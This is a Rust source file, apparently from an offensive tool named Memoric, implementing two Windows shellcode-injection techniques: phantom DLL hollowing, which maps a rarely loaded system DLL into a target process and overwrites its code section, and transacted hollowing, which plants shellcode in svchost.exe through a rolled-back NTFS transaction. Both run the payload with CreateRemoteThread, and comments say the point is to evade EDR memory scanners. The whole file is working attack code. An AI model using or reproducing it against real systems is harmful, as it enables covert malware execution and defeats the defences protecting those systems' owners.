//! Phantom DLL Hollowing Injection
//! Maps a legitimate DLL from disk using SEC_IMAGE, then overwrites its in-memory sections
//! with shellcode. The resulting memory has file-backed attributes (MEM_IMAGE) rather than
//! MEM_PRIVATE, making it appear legitimate to EDR memory scanners.

use crate::error::MemoricError;
use serde_json::Value;

/// Phantom DLL Hollowing — map a clean DLL as SEC_IMAGE then overwrite with shellcode
pub fn phantom_dll_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_SHARE_READ, OPEN_EXISTING,
    };
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{
        VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };
    use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing pid".to_string()))? as u32;
    let shellcode: Vec<u8> = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::WindowsApi("Missing shellcode".to_string()))?
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    // Use a DLL that exists but is rarely loaded — phantom target
    let dll_path = args
        .get("dll_path")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\System32\\aclui.dll");

    if shellcode.is_empty() {
        return Err(MemoricError::WindowsApi("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Phantom DLL hollowing: PID {} via {} ({} bytes)",
        pid,
        dll_path,
        shellcode.len()
    );

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let process = crate::safe_handle::SafeHandle::new(process);

        // Step 1: Open the DLL file
        let dll_w: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
        let file_handle = CreateFileW(
            PCWSTR(dll_w.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFile {}: {}", dll_path, e)))?;

        // Step 2: Create SEC_IMAGE section (file mapping with image attributes)
        let section = windows::Win32::System::Memory::CreateFileMappingW(
            file_handle,
            None,
            windows::Win32::System::Memory::PAGE_READONLY
                | windows::Win32::System::Memory::SEC_IMAGE,
            0,
            0,
            None,
        )
        .map_err(|e| {
            let _ = windows::Win32::Foundation::CloseHandle(file_handle);
            MemoricError::WindowsApi(format!("CreateFileMapping SEC_IMAGE: {}", e))
        })?;

        let _ = windows::Win32::Foundation::CloseHandle(file_handle);

        // Step 3: Map view into remote process using NtMapViewOfSection
        // Since MapViewOfFile only maps into our process, we use NtMapViewOfSection for remote
        type NtMapViewOfSectionFn = unsafe extern "system" fn(
            SectionHandle: *mut std::ffi::c_void,
            ProcessHandle: *mut std::ffi::c_void,
            BaseAddress: *mut *mut std::ffi::c_void,
            ZeroBits: usize,
            CommitSize: usize,
            SectionOffset: *mut i64,
            ViewSize: *mut usize,
            InheritDisposition: u32,
            AllocationType: u32,
            Win32Protect: u32,
        ) -> i32;

        let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let ntdll =
            windows::Win32::System::LibraryLoader::GetModuleHandleW(PCWSTR(ntdll_w.as_ptr()))
                .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

        let map_fn_name = windows::core::PCSTR(b"NtMapViewOfSection\0".as_ptr());
        let map_fn = windows::Win32::System::LibraryLoader::GetProcAddress(ntdll, map_fn_name)
            .ok_or_else(|| MemoricError::WindowsApi("NtMapViewOfSection not found".to_string()))?;
        let nt_map: NtMapViewOfSectionFn = std::mem::transmute(map_fn);

        let mut remote_base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let mut section_offset: i64 = 0;

        let status = nt_map(
            section.0 as *mut _,
            (*process).0 as *mut _,
            &mut remote_base,
            0,
            0,
            &mut section_offset,
            &mut view_size,
            2, // ViewUnmap
            0,
            0x02, // PAGE_READONLY
        );

        let _ = windows::Win32::Foundation::CloseHandle(section);

        if status < 0 || remote_base.is_null() {
            return Err(MemoricError::WindowsApi(format!(
                "NtMapViewOfSection failed: NTSTATUS 0x{:08X}",
                status as u32
            )));
        }

        let remote_base_addr = remote_base as usize;

        // Step 4: Parse the mapped PE to find .text section
        let mut pe_buf = vec![0u8; 1024];
        let mut bytes_read = 0usize;
        ReadProcessMemory(
            *process,
            remote_base,
            pe_buf.as_mut_ptr() as _,
            1024,
            Some(&mut bytes_read),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Read mapped PE header: {}", e)))?;

        let e_lfanew =
            u32::from_le_bytes([pe_buf[0x3C], pe_buf[0x3D], pe_buf[0x3E], pe_buf[0x3F]]) as usize;
        let pe_off = e_lfanew;
        if pe_off + 200 > pe_buf.len() {
            return Err(MemoricError::WindowsApi(
                "PE header out of range".to_string(),
            ));
        }

        let num_sections = u16::from_le_bytes([pe_buf[pe_off + 6], pe_buf[pe_off + 7]]) as usize;
        let opt_size = u16::from_le_bytes([pe_buf[pe_off + 20], pe_buf[pe_off + 21]]) as usize;
        let section_start = pe_off + 24 + opt_size;

        let mut text_rva = 0usize;
        let mut text_size = 0usize;

        for i in 0..num_sections {
            let s = section_start + i * 40;
            if s + 40 > pe_buf.len() {
                break;
            }
            let name = std::str::from_utf8(&pe_buf[s..s + 8])
                .unwrap_or("")
                .trim_end_matches('\0');
            let vsize =
                u32::from_le_bytes([pe_buf[s + 8], pe_buf[s + 9], pe_buf[s + 10], pe_buf[s + 11]])
                    as usize;
            let vrva = u32::from_le_bytes([
                pe_buf[s + 12],
                pe_buf[s + 13],
                pe_buf[s + 14],
                pe_buf[s + 15],
            ]) as usize;

            if name == ".text" {
                text_rva = vrva;
                text_size = vsize;
                break;
            }
            if i == 0 {
                text_rva = vrva;
                text_size = vsize;
            } // fallback to first section
        }

        if shellcode.len() > text_size {
            return Err(MemoricError::WindowsApi(format!(
                ".text section ({} bytes) too small for shellcode ({} bytes)",
                text_size,
                shellcode.len()
            )));
        }

        // Step 5: Overwrite .text with shellcode
        let write_addr = remote_base_addr + text_rva;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *process,
            write_addr as *mut _,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtectEx: {}", e)))?;

        let mut written = 0usize;
        WriteProcessMemory(
            *process,
            write_addr as *mut _,
            shellcode.as_ptr() as _,
            shellcode.len(),
            Some(&mut written),
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Write shellcode: {}", e)))?;

        let _ = VirtualProtectEx(
            *process,
            write_addr as *mut _,
            shellcode.len(),
            old_protect,
            &mut old_protect,
        );

        // Step 6: Execute from the stomped address
        let exec_thread = CreateRemoteThread(
            *process,
            None,
            0,
            Some(std::mem::transmute(write_addr)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateRemoteThread: {}", e)))?;

        let tid = windows::Win32::System::Threading::GetThreadId(exec_thread);
        let _ = windows::Win32::Foundation::CloseHandle(exec_thread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "phantom_dll_hollowing",
            "pid": pid,
            "dll_path": dll_path,
            "remote_base": format!("0x{:X}", remote_base_addr),
            "text_address": format!("0x{:X}", write_addr),
            "view_size": view_size,
            "shellcode_size": shellcode.len(),
            "thread_id": tid,
            "memory_type": "MEM_IMAGE (file-backed)",
            "message": format!("Phantom DLL: shellcode in image-backed memory at 0x{:X}", write_addr)
        }))
    }
}

/// Transacted Hollowing — use NTFS transactions to create a temporary modified file,
/// map it as SEC_IMAGE, then roll back the transaction. The mapping persists but the
/// file on disk reverts to its original state.
pub fn transacted_hollowing(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::Storage::FileSystem::{
        FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ,
        OPEN_EXISTING,
    };
    use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::WindowsApi("Missing pid".to_string()))? as u32;
    let shellcode: Vec<u8> = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::WindowsApi("Missing shellcode".to_string()))?
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    let target_exe = args
        .get("target_exe")
        .and_then(|v| v.as_str())
        .unwrap_or("C:\\Windows\\System32\\svchost.exe");

    if shellcode.is_empty() {
        return Err(MemoricError::WindowsApi("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Transacted hollowing: PID {} via {} ({} bytes)",
        pid,
        target_exe,
        shellcode.len()
    );

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let process = crate::safe_handle::SafeHandle::new(process);

        // Step 1: Create an NTFS transaction
        type NtCreateTransactionFn = unsafe extern "system" fn(
            TransactionHandle: *mut *mut std::ffi::c_void,
            DesiredAccess: u32,
            ObjectAttributes: *mut std::ffi::c_void,
            Uow: *mut std::ffi::c_void,
            TmHandle: *mut std::ffi::c_void,
            CreateOptions: u32,
            IsolationLevel: u32,
            IsolationFlags: u32,
            Timeout: *mut i64,
            Description: *mut std::ffi::c_void,
        ) -> i32;

        let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
        let ntdll =
            windows::Win32::System::LibraryLoader::GetModuleHandleW(PCWSTR(ntdll_w.as_ptr()))
                .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

        let create_txn_fn = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtCreateTransaction\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("NtCreateTransaction not found".to_string()))?;
        let nt_create_txn: NtCreateTransactionFn = std::mem::transmute(create_txn_fn);

        let mut txn_handle: *mut std::ffi::c_void = std::ptr::null_mut();
        let status = nt_create_txn(
            &mut txn_handle,
            0x000F01FF, // TRANSACTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            0,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        if status < 0 || txn_handle.is_null() {
            return Err(MemoricError::WindowsApi(format!(
                "NtCreateTransaction: 0x{:08X}",
                status as u32
            )));
        }

        // Step 2: Open target EXE within the transaction using CreateFileTransactedW
        type CreateFileTransactedWFn = unsafe extern "system" fn(
            lpFileName: *const u16,
            dwDesiredAccess: u32,
            dwShareMode: u32,
            lpSecurityAttributes: *mut std::ffi::c_void,
            dwCreationDisposition: u32,
            dwFlagsAndAttributes: u32,
            hTemplateFile: *mut std::ffi::c_void,
            hTransaction: *mut std::ffi::c_void,
            pusMiniVersion: *mut u16,
            lpExtendedParameter: *mut std::ffi::c_void,
        ) -> *mut std::ffi::c_void;

        let k32_w: Vec<u16> = "kernel32.dll\0".encode_utf16().collect();
        let kernel32 =
            windows::Win32::System::LibraryLoader::GetModuleHandleW(PCWSTR(k32_w.as_ptr()))
                .map_err(|e| MemoricError::WindowsApi(format!("kernel32: {}", e)))?;

        let create_txn_file_fn = windows::Win32::System::LibraryLoader::GetProcAddress(
            kernel32,
            windows::core::PCSTR(b"CreateFileTransactedW\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("CreateFileTransactedW not found".to_string()))?;
        let create_file_txn: CreateFileTransactedWFn = std::mem::transmute(create_txn_file_fn);

        let target_w: Vec<u16> = target_exe
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let txn_file = create_file_txn(
            target_w.as_ptr(),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            FILE_SHARE_READ.0,
            std::ptr::null_mut(),
            OPEN_EXISTING.0,
            FILE_ATTRIBUTE_NORMAL.0,
            std::ptr::null_mut(),
            txn_handle,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        if txn_file.is_null() || txn_file == (-1isize as *mut _) {
            let _ = windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
                txn_handle,
            ));
            return Err(MemoricError::WindowsApi(
                "CreateFileTransactedW failed".to_string(),
            ));
        }

        let txn_file_handle = windows::Win32::Foundation::HANDLE(txn_file);

        // Step 3: Write shellcode into the transacted file (overwrite entry point area)
        // First read the original to find entry point offset
        let mut pe_buf = vec![0u8; 4096];
        let mut bytes_read = 0u32;
        windows::Win32::Storage::FileSystem::ReadFile(
            txn_file_handle,
            Some(&mut pe_buf),
            Some(&mut bytes_read),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Read transacted file: {}", e)))?;

        let e_lfanew =
            u32::from_le_bytes([pe_buf[0x3C], pe_buf[0x3D], pe_buf[0x3E], pe_buf[0x3F]]) as usize;
        let entry_rva = u32::from_le_bytes([
            pe_buf[e_lfanew + 40],
            pe_buf[e_lfanew + 41],
            pe_buf[e_lfanew + 42],
            pe_buf[e_lfanew + 43],
        ]) as usize;

        // Find the file offset for the entry point RVA
        let num_sections =
            u16::from_le_bytes([pe_buf[e_lfanew + 6], pe_buf[e_lfanew + 7]]) as usize;
        let opt_size = u16::from_le_bytes([pe_buf[e_lfanew + 20], pe_buf[e_lfanew + 21]]) as usize;
        let sect_start = e_lfanew + 24 + opt_size;

        let mut file_offset = entry_rva; // fallback

        for i in 0..num_sections {
            let s = sect_start + i * 40;
            if s + 40 > pe_buf.len() {
                break;
            }
            let vrva = u32::from_le_bytes([
                pe_buf[s + 12],
                pe_buf[s + 13],
                pe_buf[s + 14],
                pe_buf[s + 15],
            ]) as usize;
            let vsize =
                u32::from_le_bytes([pe_buf[s + 8], pe_buf[s + 9], pe_buf[s + 10], pe_buf[s + 11]])
                    as usize;
            let raw_ptr = u32::from_le_bytes([
                pe_buf[s + 20],
                pe_buf[s + 21],
                pe_buf[s + 22],
                pe_buf[s + 23],
            ]) as usize;

            if entry_rva >= vrva && entry_rva < vrva + vsize {
                file_offset = raw_ptr + (entry_rva - vrva);
                break;
            }
        }

        // Seek and write shellcode at the entry point file offset
        windows::Win32::Storage::FileSystem::SetFilePointer(
            txn_file_handle,
            file_offset as i32,
            None,
            windows::Win32::Storage::FileSystem::FILE_BEGIN,
        );

        let mut bytes_written = 0u32;
        windows::Win32::Storage::FileSystem::WriteFile(
            txn_file_handle,
            Some(&shellcode),
            Some(&mut bytes_written),
            None,
        )
        .map_err(|e| {
            MemoricError::WindowsApi(format!("Write shellcode to transacted file: {}", e))
        })?;

        // Step 4: Create SEC_IMAGE mapping from transacted file
        let section = windows::Win32::System::Memory::CreateFileMappingW(
            txn_file_handle,
            None,
            windows::Win32::System::Memory::PAGE_READONLY
                | windows::Win32::System::Memory::SEC_IMAGE,
            0,
            0,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("CreateFileMapping SEC_IMAGE: {}", e)))?;

        let _ = windows::Win32::Foundation::CloseHandle(txn_file_handle);

        // Step 5: Rollback the transaction — file on disk reverts
        type NtRollbackTransactionFn =
            unsafe extern "system" fn(TransactionHandle: *mut std::ffi::c_void, Wait: u8) -> i32;

        let rollback_fn = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtRollbackTransaction\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("NtRollbackTransaction not found".to_string()))?;
        let nt_rollback: NtRollbackTransactionFn = std::mem::transmute(rollback_fn);
        nt_rollback(txn_handle, 1);
        let _ =
            windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(txn_handle));

        // Step 6: Map the section into remote process
        type NtMapViewOfSectionFn = unsafe extern "system" fn(
            SectionHandle: *mut std::ffi::c_void,
            ProcessHandle: *mut std::ffi::c_void,
            BaseAddress: *mut *mut std::ffi::c_void,
            ZeroBits: usize,
            CommitSize: usize,
            SectionOffset: *mut i64,
            ViewSize: *mut usize,
            InheritDisposition: u32,
            AllocationType: u32,
            Win32Protect: u32,
        ) -> i32;

        let map_fn = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::PCSTR(b"NtMapViewOfSection\0".as_ptr()),
        )
        .ok_or_else(|| MemoricError::WindowsApi("NtMapViewOfSection not found".to_string()))?;
        let nt_map: NtMapViewOfSectionFn = std::mem::transmute(map_fn);

        let mut remote_base: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;
        let mut sect_offset: i64 = 0;

        let map_status = nt_map(
            section.0 as *mut _,
            (*process).0 as *mut _,
            &mut remote_base,
            0,
            0,
            &mut sect_offset,
            &mut view_size,
            2,
            0,
            0x02,
        );

        let _ = windows::Win32::Foundation::CloseHandle(section);

        if map_status < 0 || remote_base.is_null() {
            return Err(MemoricError::WindowsApi(format!(
                "NtMapViewOfSection: 0x{:08X}",
                map_status as u32
            )));
        }

        // Step 7: Execute from remapped entry point
        let exec_addr = remote_base as usize + entry_rva;
        let exec_thread = CreateRemoteThread(
            *process,
            None,
            0,
            Some(std::mem::transmute(exec_addr)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Execute: {}", e)))?;

        let tid = windows::Win32::System::Threading::GetThreadId(exec_thread);
        let _ = windows::Win32::Foundation::CloseHandle(exec_thread);

        Ok(serde_json::json!({
            "success": true,
            "technique": "transacted_hollowing",
            "pid": pid,
            "target_exe": target_exe,
            "remote_base": format!("0x{:X}", remote_base as usize),
            "entry_point": format!("0x{:X}", exec_addr),
            "view_size": view_size,
            "shellcode_size": shellcode.len(),
            "thread_id": tid,
            "transaction_rolled_back": true,
            "message": format!("Transacted hollowing: file-backed execution at 0x{:X}, transaction rolled back", exec_addr)
        }))
    }
}
